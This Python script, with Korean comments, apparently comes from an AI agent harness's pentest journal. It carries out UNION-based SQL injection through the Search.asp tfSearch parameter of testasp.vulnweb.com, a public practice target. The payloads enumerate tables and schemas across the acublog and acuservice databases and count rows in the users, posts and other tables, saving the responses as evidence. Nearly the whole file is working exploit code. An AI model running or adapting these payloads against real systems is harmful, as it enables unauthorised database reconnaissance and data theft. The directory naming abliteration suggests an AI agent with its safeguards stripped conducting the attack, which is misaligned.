#!/usr/bin/env python3
"""Round 7 보강 4 — 교차 DB 정찰(acublog/acuservice) 읽기 전용."""
import os
import subprocess
import urllib.parse

BASE = "http://testasp.vulnweb.com"
PROXY = ["-x", "http://127.0.0.1:8080",
         "--cacert", "/home/taeuk/.mitmproxy/mitmproxy-ca-cert.pem"]
J = "/home/taeuk/projects/llm-abliteration/hermes-harness/journal/web/testphp-vulnweb-test"
SCR = f"{J}/scratch/r7"
EVI = f"{J}/evidence/r7"
os.makedirs(EVI, exist_ok=True)


def render_row(body):
    out = {}
    i = body.find("posted by")
    if i >= 0:
        j = body.find("</b>", i)
        out["poster"] = body[i + 9:j].strip()
    for key, div in (("title", "posttitle"), ("message", "posttext")):
        k = f"{div}'>"
        i = body.find(k)
        if i >= 0:
            j = body.find("</div>", i)
            out[key] = body[i + len(k):j].strip()
    return out


def union(select_list, tag):
    st = "q')>0) UNION ALL SELECT " + select_list + "--"
    url = f"{BASE}/Search.asp?tfSearch=" + urllib.parse.quote(st, safe="")
    bod = f"{SCR}/U_{tag}.html"
    r = subprocess.run(["curl", "-s", "-S"] + PROXY +
                       ["-m", "60", "-D", f"{SCR}/_h.tmp", "-o", bod,
                        "-w", "%{http_code} %{time_total}", url],
                       capture_output=True, text=True)
    body = open(bod, "rb").read().decode("latin-1")
    with open(f"{EVI}/r7_search_union_{tag}.html", "w", encoding="latin-1") as f:
        f.write(body)
    print(f"--- [{tag}] {(r.stdout or '').strip()}")
    vals = render_row(body)
    for k, v in vals.items():
        print(f"    {k:8} = {v}")


print("X1. 교차 DB 테이블 목록")
for db in ("acublog", "acuservice"):
    union(f"1,(SELECT STUFF((SELECT ','+name FROM {db}.sys.tables FOR XML PATH('')),1,1,''))"
          ",'T','M',1,1,GETDATE(),'A','TT','FN'", f"tables_{db}")

print()
print("X2. 교차 DB 사용자/스키마")
for db in ("acublog", "acuservice"):
    union(f"1,(SELECT STUFF((SELECT ','+name FROM {db}.sys.schemas FOR XML PATH('')),1,1,''))"
          ",'T','M',1,1,GETDATE(),'A','TT','FN'", f"schemas_{db}")
    union(f"1,CAST((SELECT COUNT(*) FROM {db}.sys.tables) AS nvarchar(20))"
          ",'T','M',1,1,GETDATE(),'A','TT','FN'", f"tablecount_{db}")

print()
print("X3. acuforum 테이블별 행 수 (참고)")
for t in ("users", "posts", "threads", "forums"):
    union(f"1,CAST((SELECT COUNT(*) FROM {t}) AS nvarchar(20))"
          ",'T','M',1,1,GETDATE(),'A','TT','FN'", f"count_{t}")
print()
print("done")
